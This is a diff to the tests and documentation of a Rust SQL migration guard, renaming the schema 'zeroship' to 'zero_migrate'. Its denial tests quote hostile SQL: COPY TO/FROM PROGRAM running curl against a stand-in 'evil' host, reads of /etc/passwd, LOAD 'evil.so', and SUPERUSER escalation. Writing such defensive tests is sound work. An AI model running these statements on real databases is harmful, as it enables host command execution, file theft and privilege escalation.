@@ -382,7 +382,7 @@ impl Default for GuardConfig {
 /// use zero_migrate::{GuardConfig, SchemaScope, TrustProfile};
 /// let _ = GuardConfig {
 ///     trust: TrustProfile::Platform,
-///     schemas: SchemaScope::Allowlist(vec!["zeroship".into()]),
+///     schemas: SchemaScope::Allowlist(vec!["zero_migrate".into()]),
 ///     extension_allowlist: vec![],
 /// };
 /// ```
@@ -1474,7 +1474,7 @@ fn foreign_schema_literal_in_body(body: &str, scope: &SchemaScope) -> Option<Str
         }
         // (1) platform schema named directly. The `PLATFORM_SCHEMAS` lexical
         //     backstop fires for any schema in PLATFORM_SCHEMAS that the scope
-        //     did NOT permit (port schemas `zeroship`/`public`
+        //     did NOT permit (port schemas `zero_migrate`/`public`
         //     are not in PLATFORM_SCHEMAS, so they already pass — §4.2/HIGH-3).
         if denylist::list_contains_ci(denylist::PLATFORM_SCHEMAS, lit) {
             return Some(lit.to_string());
@@ -3090,7 +3090,7 @@ fn stmt_text(sql: &str, raw_stmt: &protobuf::RawStmt) -> String {
 mod tests {
     use super::*;
 
-    /// A Platform guard over the real port allowlist (`zeroship` / `public`) +
+    /// A Platform guard over the real port allowlist (`zero_migrate` / `public`) +
     /// the two ported extensions. Minted via the `for_test` seam,
     /// which is `#[cfg(test)]`-only.
     fn platform_guard() -> SqlGuard {
@@ -3101,13 +3101,13 @@ mod tests {
         let cap = OperatorCapability::for_test();
         GuardConfig::platform(
             &cap,
-            vec!["zeroship".to_string(), "public".to_string()],
+            vec!["zero_migrate".to_string(), "public".to_string()],
             vec!["citext".to_string(), "uuid-ossp".to_string()],
         )
     }
 
     fn confined_guard_config() -> GuardConfig {
-        GuardConfig::confined("zeroship")
+        GuardConfig::confined("zero_migrate")
     }
 
     fn confined_guard() -> SqlGuard {
@@ -3354,7 +3354,7 @@ mod tests {
             .check("CREATE SCHEMA IF NOT EXISTS public")
             .expect("CREATE SCHEMA is not destructive");
         platform
-            .check("ALTER TABLE zeroship.app_secrets ENABLE ROW LEVEL SECURITY")
+            .check("ALTER TABLE zero_migrate.app_secrets ENABLE ROW LEVEL SECURITY")
             .expect("ENABLE RLS is not destructive");
     }
 
@@ -3457,7 +3457,7 @@ mod tests {
         let cfg = platform_guard_config().with_data_security(true, DestructiveOps::Allow);
         let author = platform_author(&cfg);
         let op = Op::PgRaw {
-            sql: "CREATE TABLE zeroship.raw_users AS SELECT 1 AS id".into(),
+            sql: "CREATE TABLE zero_migrate.raw_users AS SELECT 1 AS id".into(),
             reason: "require_rls raw table creation regression".into(),
         };
 
@@ -3484,7 +3484,7 @@ mod tests {
         let scope = guard_cfg
             .schema_scope()
             .expect("Platform guard carries an allowlist scope");
-        crate::render::lower::IrAuthor::new("zeroship", "app_corpus", SqlDialect::Postgres)
+        crate::render::lower::IrAuthor::new("zero_migrate", "app_corpus", SqlDialect::Postgres)
             .with_schema_scope(scope)
     }
 
@@ -3561,7 +3561,7 @@ mod tests {
     fn m2_stage2_site_459_belt_skip_behavior_lock() {
         assert_profile_decisions(
             "site :459 belt-skip",
-            "COPY zeroship.t TO PROGRAM 'sh -c id'",
+            "COPY zero_migrate.t TO PROGRAM 'sh -c id'",
             GuardDecision::Denied(rule::COPY_PROGRAM),
             GuardDecision::Denied(rule::COPY_PROGRAM),
             GuardDecision::Allow,
@@ -3572,7 +3572,7 @@ mod tests {
     fn m2_stage2_site_655_create_role_behavior_lock() {
         assert_profile_decisions(
             "site :655 create role",
-            "CREATE ROLE zeroship_auth NOLOGIN",
+            "CREATE ROLE zero_migrate_auth NOLOGIN",
             GuardDecision::Denied(rule::ROLE_MANAGEMENT),
             GuardDecision::Allow,
             GuardDecision::Allow,
@@ -3583,7 +3583,7 @@ mod tests {
     fn m2_stage2_site_664_alter_role_behavior_lock() {
         assert_profile_decisions(
             "site :664 alter role",
-            "ALTER ROLE zeroship_auth LOGIN",
+            "ALTER ROLE zero_migrate_auth LOGIN",
             GuardDecision::Denied(rule::ROLE_MANAGEMENT),
             GuardDecision::Allow,
             GuardDecision::Allow,
@@ -3593,8 +3593,8 @@ mod tests {
     #[test]
     fn m2_stage2_site_670_role_set_and_drop_behavior_lock() {
         for sql in [
-            "ALTER ROLE zeroship_app SET search_path = zeroship, public",
-            "DROP ROLE IF EXISTS zeroship_app",
+            "ALTER ROLE zero_migrate_app SET search_path = zero_migrate, public",
+            "DROP ROLE IF EXISTS zero_migrate_app",
         ] {
             assert_profile_decisions(
                 "site :670 alter role set / drop role",
@@ -3610,7 +3610,7 @@ mod tests {
     fn m2_stage2_site_682_grant_stmt_behavior_lock() {
         assert_profile_decisions(
             "site :682 grant stmt",
-            "GRANT CONNECT ON DATABASE zeroship TO zeroship_app",
+            "GRANT CONNECT ON DATABASE zero_migrate TO zero_migrate_app",
             GuardDecision::Denied(rule::PRIVILEGE_MANAGEMENT),
             GuardDecision::Allow,
             GuardDecision::Allow,
@@ -3621,7 +3621,7 @@ mod tests {
     fn m2_stage2_site_691_grant_role_stmt_behavior_lock() {
         assert_profile_decisions(
             "site :691 grant role stmt",
-            "GRANT zeroship_app TO zeroship_worker",
+            "GRANT zero_migrate_app TO zero_migrate_worker",
             GuardDecision::Denied(rule::PRIVILEGE_MANAGEMENT),
             GuardDecision::Allow,
             GuardDecision::Allow,
@@ -3632,7 +3632,7 @@ mod tests {
     fn m2_stage2_site_700_alter_default_privileges_behavior_lock() {
         assert_profile_decisions(
             "site :700 alter default privileges",
-            "ALTER DEFAULT PRIVILEGES IN SCHEMA zeroship GRANT SELECT ON TABLES TO zeroship_app",
+            "ALTER DEFAULT PRIVILEGES IN SCHEMA zero_migrate GRANT SELECT ON TABLES TO zero_migrate_app",
             GuardDecision::Denied(rule::PRIVILEGE_MANAGEMENT),
             GuardDecision::Allow,
             GuardDecision::Allow,
@@ -3642,7 +3642,7 @@ mod tests {
     #[test]
     fn m2_stage2_site_798_drop_stmt_behavior_lock() {
         for sql in [
-            "DROP POLICY IF EXISTS tenant_isolation ON zeroship.app_secrets",
+            "DROP POLICY IF EXISTS tenant_isolation ON zero_migrate.app_secrets",
             "DROP SCHEMA IF EXISTS public CASCADE",
             "DROP EXTENSION IF EXISTS citext",
         ] {
@@ -3671,7 +3671,7 @@ mod tests {
     fn m2_stage2_site_829_create_policy_behavior_lock() {
         assert_profile_decisions(
             "site :829 create policy",
-            "CREATE POLICY tenant_isolation ON zeroship.app_secrets USING (true)",
+            "CREATE POLICY tenant_isolation ON zero_migrate.app_secrets USING (true)",
             GuardDecision::Denied(rule::UNRECOGNIZED_DANGEROUS),
             GuardDecision::Allow,
             GuardDecision::Allow,
@@ -3682,7 +3682,7 @@ mod tests {
     fn m2_stage2_site_836_drop_owned_behavior_lock() {
         assert_profile_decisions(
             "site :836 drop owned",
-            "DROP OWNED BY zeroship_auth",
+            "DROP OWNED BY zero_migrate_auth",
             GuardDecision::Denied(rule::UNRECOGNIZED_DANGEROUS),
             GuardDecision::Allow,
             GuardDecision::Allow,
@@ -3693,7 +3693,7 @@ mod tests {
     fn m2_stage2_site_900_rls_alter_table_behavior_lock() {
         assert_profile_decisions(
             "site :900 RLS alter table",
-            "ALTER TABLE zeroship.app_secrets ENABLE ROW LEVEL SECURITY",
+            "ALTER TABLE zero_migrate.app_secrets ENABLE ROW LEVEL SECURITY",
             GuardDecision::Denied(rule::UNSAFE_ALTER_TABLE_CMD),
             GuardDecision::Allow,
             GuardDecision::Allow,
@@ -3843,13 +3843,13 @@ mod tests {
     fn t11_platform_capability_mints_only_via_runner_seam() {
         let cap = OperatorCapability::for_test();
         // The token grants a Platform GuardConfig + ExecutorConfig.
-        let gcfg = GuardConfig::platform(&cap, vec!["zeroship".into()], vec![]);
+        let gcfg = GuardConfig::platform(&cap, vec!["zero_migrate".into()], vec![]);
         assert_eq!(gcfg.trust(), TrustProfile::Platform);
         let ecfg = crate::conn::ExecutorConfig::platform(
             &cap,
             "platform",
-            "zeroship",
-            vec!["zeroship".into()],
+            "zero_migrate",
+            vec!["zero_migrate".into()],
             vec![],
         );
         assert_eq!(ecfg.guard_config().trust(), TrustProfile::Platform);
@@ -3865,36 +3865,36 @@ mod tests {
         let g = platform_guard();
         let allowed = [
             // role mgmt
-            "CREATE ROLE zeroship_auth NOLOGIN",
-            "ALTER ROLE zeroship_auth SET search_path = zeroship, public",
-            "ALTER ROLE zeroship_auth RESET search_path",
-            "DROP ROLE IF EXISTS zeroship_auth",
+            "CREATE ROLE zero_migrate_auth NOLOGIN",
+            "ALTER ROLE zero_migrate_auth SET search_path = zero_migrate, public",
+            "ALTER ROLE zero_migrate_auth RESET search_path",
+            "DROP ROLE IF EXISTS zero_migrate_auth",
             // grant / privilege mgmt
-            "GRANT CONNECT ON DATABASE zeroship TO zeroship_auth",
-            "GRANT USAGE ON SCHEMA public TO zeroship_auth",
-            "REVOKE USAGE ON SCHEMA public FROM zeroship_auth",
-            "ALTER DEFAULT PRIVILEGES IN SCHEMA zeroship GRANT SELECT ON TABLES TO zeroship_app",
+            "GRANT CONNECT ON DATABASE zero_migrate TO zero_migrate_auth",
+            "GRANT USAGE ON SCHEMA public TO zero_migrate_auth",
+            "REVOKE USAGE ON SCHEMA public FROM zero_migrate_auth",
+            "ALTER DEFAULT PRIVILEGES IN SCHEMA zero_migrate GRANT SELECT ON TABLES TO zero_migrate_app",
             // schema
-            "CREATE SCHEMA IF NOT EXISTS zeroship AUTHORIZATION zeroship_auth",
-            "DROP SCHEMA IF EXISTS zeroship CASCADE",
+            "CREATE SCHEMA IF NOT EXISTS zero_migrate AUTHORIZATION zero_migrate_auth",
+            "DROP SCHEMA IF EXISTS zero_migrate CASCADE",
             // RLS — the four toggles
-            "ALTER TABLE zeroship.app_secrets ENABLE ROW LEVEL SECURITY",
-            "ALTER TABLE zeroship.app_secrets FORCE ROW LEVEL SECURITY",
-            "ALTER TABLE zeroship.app_secrets NO FORCE ROW LEVEL SECURITY",
-            "ALTER TABLE zeroship.app_secrets DISABLE ROW LEVEL SECURITY",
+            "ALTER TABLE zero_migrate.app_secrets ENABLE ROW LEVEL SECURITY",
+            "ALTER TABLE zero_migrate.app_secrets FORCE ROW LEVEL SECURITY",
+            "ALTER TABLE zero_migrate.app_secrets NO FORCE ROW LEVEL SECURITY",
+            "ALTER TABLE zero_migrate.app_secrets DISABLE ROW LEVEL SECURITY",
             // policy
-            "CREATE POLICY tenant_isolation ON zeroship.app_secrets \
-             USING (app_id = current_setting('zeroship.tenant_app', true)::uuid)",
-            "DROP POLICY IF EXISTS tenant_isolation ON zeroship.app_secrets",
+            "CREATE POLICY tenant_isolation ON zero_migrate.app_secrets \
+             USING (app_id = current_setting('zero_migrate.tenant_app', true)::uuid)",
+            "DROP POLICY IF EXISTS tenant_isolation ON zero_migrate.app_secrets",
             // extensions (allowlisted under Platform)
             "CREATE EXTENSION citext",
             "CREATE EXTENSION IF NOT EXISTS \"uuid-ossp\" WITH SCHEMA public",
             "DROP EXTENSION IF EXISTS \"uuid-ossp\"",
             // DROP OWNED BY (0025 rollback)
-            "DROP OWNED BY zeroship_auth",
+            "DROP OWNED BY zero_migrate_auth",
             // cross-schema references within the allowlist
             "CREATE TABLE public.clients(id int primary key)",
-            "INSERT INTO public.t SELECT * FROM zeroship.app_secrets",
+            "INSERT INTO public.t SELECT * FROM zero_migrate.app_secrets",
         ];
         for sql in allowed {
             assert!(
@@ -3910,18 +3910,18 @@ mod tests {
         let g = platform_guard();
         let denied = [
             // RCE / host escape — kept hard in BOTH profiles
-            "COPY zeroship.t TO PROGRAM 'sh -c \"curl evil\"'",
-            "COPY zeroship.t FROM '/etc/passwd'",
+            "COPY zero_migrate.t TO PROGRAM 'sh -c \"curl evil\"'",
+            "COPY zero_migrate.t FROM '/etc/passwd'",
             "SELECT pg_read_file('/etc/passwd')",
             "CREATE EXTENSION dblink",
             "CREATE EXTENSION postgres_fdw",
-            "CREATE FUNCTION zeroship.f() RETURNS void AS 'x' LANGUAGE plpythonu",
+            "CREATE FUNCTION zero_migrate.f() RETURNS void AS 'x' LANGUAGE plpythonu",
             "ALTER SYSTEM SET wal_level = minimal",
-            "CREATE FUNCTION zeroship.g() RETURNS int LANGUAGE sql SECURITY DEFINER AS $$ SELECT 1 $$",
+            "CREATE FUNCTION zero_migrate.g() RETURNS int LANGUAGE sql SECURITY DEFINER AS $$ SELECT 1 $$",
             "LOAD 'evil.so'",
             // cross-schema to a NON-allowlisted (creator) schema
             "CREATE TABLE proj_acme.steal(id int)",
-            "INSERT INTO proj_acme.t SELECT * FROM zeroship.app_secrets",
+            "INSERT INTO proj_acme.t SELECT * FROM zero_migrate.app_secrets",
         ];
         for sql in denied {
             assert!(
@@ -3939,17 +3939,17 @@ mod tests {
     /// recursion arm and the relaxed token-scan), DENIED under Confined.
     const BOOTSTRAP_DO: &str = "DO $bootstrap$
         BEGIN
-            EXECUTE 'CREATE ROLE zeroship_app NOLOGIN';
-            EXECUTE 'ALTER ROLE zeroship_app SET search_path = zeroship, public';
-            EXECUTE 'GRANT USAGE ON SCHEMA zeroship TO zeroship_app';
+            EXECUTE 'CREATE ROLE zero_migrate_app NOLOGIN';
+            EXECUTE 'ALTER ROLE zero_migrate_app SET search_path = zero_migrate, public';
+            EXECUTE 'GRANT USAGE ON SCHEMA zero_migrate TO zero_migrate_app';
         END
         $bootstrap$;";
 
     /// A platform role bootstrap shape: a DO block with a bare (parsed) CREATE ROLE inside.
     const PLATFORM_ROLE_DO: &str = "DO $$
         BEGIN
-            IF NOT EXISTS (SELECT FROM pg_roles WHERE rolname = 'zeroship_gateway') THEN
-                CREATE ROLE zeroship_gateway NOLOGIN;
+            IF NOT EXISTS (SELECT FROM pg_roles WHERE rolname = 'zero_migrate_gateway') THEN
+                CREATE ROLE zero_migrate_gateway NOLOGIN;
             END IF;
         END
         $$;";
@@ -3983,7 +3983,7 @@ mod tests {
     fn t4b_neg_do_block_rce_denied_even_under_platform() {
         let g = platform_guard();
         let rce_do = "DO $$ BEGIN
-            EXECUTE 'COPY zeroship.t FROM PROGRAM ''curl http://evil''';
+            EXECUTE 'COPY zero_migrate.t FROM PROGRAM ''curl http://evil''';
         END $$;";
         assert!(
             is_denied(&g, rce_do),
@@ -4002,9 +4002,9 @@ mod tests {
         let g = platform_guard();
         // A plain role create is fine under Platform (the platform mints roles).
         assert!(
-            g.check(r#"CREATE ROLE "zeroship_auth" LOGIN"#).is_ok(),
+            g.check(r#"CREATE ROLE "zero_migrate_auth" LOGIN"#).is_ok(),
             "a non-superuser CREATE ROLE must still pass under Platform: {:?}",
-            g.check(r#"CREATE ROLE "zeroship_auth" LOGIN"#)
+            g.check(r#"CREATE ROLE "zero_migrate_auth" LOGIN"#)
         );
         // But SUPERUSER reaches the host — denied even under Platform, with the
         // dedicated rule id (NOT the generic role_management, which Platform
@@ -4012,7 +4012,7 @@ mod tests {
         for sql in [
             r#"CREATE ROLE "evil" SUPERUSER"#,
             r#"CREATE ROLE "evil" LOGIN SUPERUSER BYPASSRLS"#,
-            r#"ALTER ROLE "zeroship_auth" SUPERUSER"#,
+            r#"ALTER ROLE "zero_migrate_auth" SUPERUSER"#,
         ] {
             match g.check(sql) {
                 Err(GuardError::Denied { rule: r, .. }) => assert_eq!(
@@ -4025,7 +4025,7 @@ mod tests {
         }
         // NOSUPERUSER (the negative attribute) is not an escalation — it passes.
         assert!(
-            g.check(r#"CREATE ROLE "zeroship_auth" NOSUPERUSER LOGIN"#).is_ok(),
+            g.check(r#"CREATE ROLE "zero_migrate_auth" NOSUPERUSER LOGIN"#).is_ok(),
             "NOSUPERUSER must not trip the superuser deny"
         );
     }
@@ -4081,7 +4081,7 @@ mod tests {
     fn superuser_role_in_platform_do_body_token_scan_is_denied() {
         let g = platform_guard();
         let sql = r"DO $$ BEGIN
-            EXECUTE format('ALTER ROLE %I SUPERUSER', 'zeroship_auth');
+            EXECUTE format('ALTER ROLE %I SUPERUSER', 'zero_migrate_auth');
         END $$";
 
         match g.check(sql) {
@@ -4125,15 +4125,15 @@ mod tests {
     fn host_escape_role_grant_denied_even_under_platform() {
         let g = platform_guard();
         assert!(
-            g.check(r"GRANT SELECT ON TABLE zeroship.app_secrets TO zeroship_app")
+            g.check(r"GRANT SELECT ON TABLE zero_migrate.app_secrets TO zero_migrate_app")
                 .is_ok(),
             "benign table GRANT must still pass under Platform"
         );
 
         for sql in [
-            r"GRANT pg_execute_server_program TO zeroship_app",
-            r#"GRANT "pg_read_server_files" TO zeroship_app"#,
-            r"GRANT zeroship_app TO pg_write_server_files",
+            r"GRANT pg_execute_server_program TO zero_migrate_app",
+            r#"GRANT "pg_read_server_files" TO zero_migrate_app"#,
+            r"GRANT zero_migrate_app TO pg_write_server_files",
         ] {
             assert!(
                 is_denied(&g, sql),
@@ -4150,13 +4150,13 @@ mod tests {
         let author = platform_author(&guard_cfg);
         let op = crate::model::ir::Op::CreateFunction {
             name: "audit_events_rce".into(),
-            schema: Some("zeroship".into()),
+            schema: Some("zero_migrate".into()),
             args: None,
             returns: "void".into(),
             language: crate::model::ir::FuncLanguage::Plpgsql,
             replace: Some(true),
             volatility: None,
-            body: "BEGIN COPY zeroship.audit_events TO PROGRAM 'sh -c id'; END;".into(),
+            body: "BEGIN COPY zero_migrate.audit_events TO PROGRAM 'sh -c id'; END;".into(),
         };
 
         match author.lower_guarded(
@@ -4190,7 +4190,7 @@ mod tests {
         let author = platform_author(&guard_cfg);
         let op = crate::model::ir::Op::CreateFunction {
             name: "audit_events_note".into(),
-            schema: Some("zeroship".into()),
+            schema: Some("zero_migrate".into()),
             args: None,
             returns: "void".into(),
             language: crate::model::ir::FuncLanguage::Plpgsql,
@@ -4220,7 +4220,7 @@ mod tests {
         let guard_cfg = platform_guard_config();
         let author = platform_author(&guard_cfg);
         let op = crate::model::ir::Op::PgRaw {
-            sql: "COPY zeroship.audit_events TO PROGRAM 'sh -c id'".into(),
+            sql: "COPY zero_migrate.audit_events TO PROGRAM 'sh -c id'".into(),
             reason: "raw COPY PROGRAM denial regression".into(),
         };
 
@@ -4249,14 +4249,14 @@ mod tests {
 
     #[test]
     fn vendor_role_op_is_refused_at_lower_without_platform_capability() {
-        let guard_cfg = GuardConfig::confined("zeroship");
+        let guard_cfg = GuardConfig::confined("zero_migrate");
         let author = crate::render::lower::IrAuthor::new(
-            "zeroship",
+            "zero_migrate",
             "app_corpus",
             SqlDialect::Postgres,
         );
         let op = crate::model::ir::Op::CreateRole {
-            name: "zeroship_auth".into(),
+            name: "zero_migrate_auth".into(),
             login: Some(true),
             password: None,
             bypass_rls: None,
@@ -4290,9 +4290,9 @@ mod tests {
 
     #[test]
     fn benign_vendor_policy_is_refused_at_lower_without_capability() {
-        let guard_cfg = GuardConfig::confined("zeroship");
+        let guard_cfg = GuardConfig::confined("zero_migrate");
         let author =
-            crate::render::lower::IrAuthor::new("zeroship", "app_corpus", SqlDialect::Postgres);
+            crate::render::lower::IrAuthor::new("zero_migrate", "app_corpus", SqlDialect::Postgres);
         let op = crate::model::ir::Op::CreatePolicy {
             name: "tenant_isolation".into(),
             table: "app_secrets".into(),
@@ -4323,10 +4323,10 @@ mod tests {
 
     #[test]
     fn t2_func_def_target_single_is_byte_identical() {
-        let g = confined_guard(); // Single("zeroship")
+        let g = confined_guard(); // Single("zero_migrate")
         // own-schema funcname → OK; foreign funcname → CrossSchema.
         assert!(g
-            .check("CREATE FUNCTION zeroship.f() RETURNS int LANGUAGE sql AS $$ SELECT 1 $$")
+            .check("CREATE FUNCTION zero_migrate.f() RETURNS int LANGUAGE sql AS $$ SELECT 1 $$")
             .is_ok());
         assert!(matches!(
             g.check("CREATE FUNCTION public.f() RETURNS int LANGUAGE sql AS $$ SELECT 1 $$"),
@@ -4340,7 +4340,7 @@ mod tests {
 
     #[test]
     fn t2_literal_schema_refs_single_is_byte_identical() {
-        let g = confined_guard(); // Single("zeroship")
+        let g = confined_guard(); // Single("zero_migrate")
         assert!(matches!(
             g.check("SELECT 'control.t'::regclass"),
             Err(GuardError::CrossSchema { .. })
@@ -4350,12 +4350,12 @@ mod tests {
             Err(GuardError::CrossSchema { .. })
         ));
         // own-schema literal ref → OK.
-        assert!(g.check("SELECT nextval('zeroship.s')").is_ok());
+        assert!(g.check("SELECT nextval('zero_migrate.s')").is_ok());
     }
 
     #[test]
     fn t2_platform_func_def_and_literal_refs_respect_allowlist() {
-        let g = platform_guard(); // Allowlist(zeroship, public)
+        let g = platform_guard(); // Allowlist(zero_migrate, public)
         // allowlisted schema → OK
         assert!(g
             .check("CREATE FUNCTION public.f() RETURNS int LANGUAGE sql AS $$ SELECT 1 $$")
@@ -4370,9 +4370,9 @@ mod tests {
 
     #[test]
     fn schema_scope_permits_is_case_insensitive() {
-        assert!(SchemaScope::Single("Zeroship".into()).permits("zeroship"));
+        assert!(SchemaScope::Single("Zero_migrate".into()).permits("zero_migrate"));
         assert!(SchemaScope::Allowlist(vec!["PubLic".into()]).permits("public"));
-        assert!(!SchemaScope::Single("zeroship".into()).permits("control"));
+        assert!(!SchemaScope::Single("zero_migrate".into()).permits("control"));
     }
 
     // ---- Track A: the Trusted profile (public dbmate-like posture) ---------
@@ -4563,7 +4563,7 @@ mod tests {
         // cross-schema op still DENIES (Platform's deny-list is intact, NOT skipped).
         let platform = platform_guard();
         assert!(
-            platform.check("CREATE ROLE zeroship_auth NOLOGIN").is_ok(),
+            platform.check("CREATE ROLE zero_migrate_auth NOLOGIN").is_ok(),
             "Platform widening intact"
         );
         assert!(
